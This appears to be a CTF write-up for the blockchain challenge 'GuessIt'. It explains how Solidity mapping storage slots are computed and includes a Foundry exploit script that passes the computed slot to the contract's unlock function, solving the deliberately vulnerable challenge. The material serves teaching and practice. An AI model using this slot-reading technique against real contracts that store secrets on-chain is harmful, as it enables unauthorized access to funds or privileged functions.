+++
date = '2024-12-30T08:39:43+05:30'
draft = true
title = 'Guess It'
categories=["Blockchain"]
series="War-Games-CTF"
tags=["Storage Layout"]
+++

# Writeup for GuessIt

- Before diving into this writeup, it’s crucial to have a solid understanding of Foundry, a powerful framework for Ethereum smart contract development. Foundry will be your primary tool for writing, testing, and breaking contracts in this guide.

### Challenge Description

Santa Clause has been kidnapped and is kept in a secret dungeon, can u unlock this contract and save him?

**Author:** MaanVad3r

### The Challenge and Exploit

The below are source contracts

1. **GuessIt** contract

```solidity
pragma solidity ^0.8.20;

contract EasyChallenge {
    uint constant isKey = 0x1337;

    bool public isKeyFound;
    mapping (uint => bytes32) keys; 

    constructor() {
        keys[isKey] = keccak256(
            abi.encodePacked(block.number, msg.sender) 
        );
    }

    function unlock(uint slot) external {
        bytes32 key;
        assembly {
            key := sload(slot)
        }
        require(key == keys[isKey]);
        isKeyFound = true;
    }
}
```

2. **Setup** contract

```solidity
pragma solidity ^0.8.20;

import "./GuessIt.sol";

contract Setup {
    EasyChallenge public challengeInstane;

    constructor() {
        challengeInstane = new EasyChallenge();
    }

    function isSolved() public view returns (bool) {
        return challengeInstane.isKeyFound(); 
    }
}
```

Our task is to make the `Setup:isSolved` function return true. This function will return true if the `GuessIt:isKeyFound` function returns true. Therefore, to solve this challenge, we need to make `GuessIt:isKeyFound `return true.

```solidity
function unlock(uint slot) external {
    bytes32 key;
    assembly {
        key := sload(slot)
    }
    require(key == keys[isKey]);
    isKeyFound = true;
}
```

`isKeyFound` is set to `true` only in this function. To call this function, we need to pass the storage slot address as a parameter. The function will load the content from the given slot and compare it with the value stored in the `keys` mapping for the key `isKey` (which is `0x1337`).

Technically, we need to pass the storage slot where the `keys` mapping holds the value for the key `0x1337`. If the content in that slot matches, the `isKeyFound` variable will be set to true.

The storage slot of any mapping can be calculated using the formula `keccak256(key, slot)`, where `key` is the key you are looking for in the mapping, and `slot` is the position of the mapping variable itself in the contract’s storage layout. The resulting hash points to the specific storage slot for the given key within the mapping.

In the `GuessIt` contract, `isKey` is a constant variable, which means it’s not stored in the contract's storage. Instead, its value (in this case, `0x1337`) is embedded directly in the contract’s bytecode. The `isKeyFound` variable is stored in storage slot 0, while the `keys` mapping starts at storage slot 1. To find the specific value in the keys mapping for the key `0x1337`, we calculate the storage slot using `keccak256(0x1337, 1)`.

The below is the Exploit script.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";

interface IEasyChallenge{
    function unlock(uint slot) external;
    function isKey()external view returns(uint256);
}

interface ISetup{
    function challengeInstane() external view returns(IEasyChallenge);
    
}
contract ExploitGuess is Script{
    ISetup setup;
    uint constant isKey = 0x1337;
    uint baseSlot = 1;
    function run()public{
        address _setup=address(/* YOUR_SETUP_ADDRESS */);
        vm.startBroadcast();
        setup=ISetup(_setup);
        IEasyChallenge challenge=setup.challengeInstane();
        uint256 slot=uint256(keccak256(abi.encodePacked(isKey, baseSlot)));
        challenge.unlock(slot);
        vm.stopBroadcast();
    }
}
```


<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>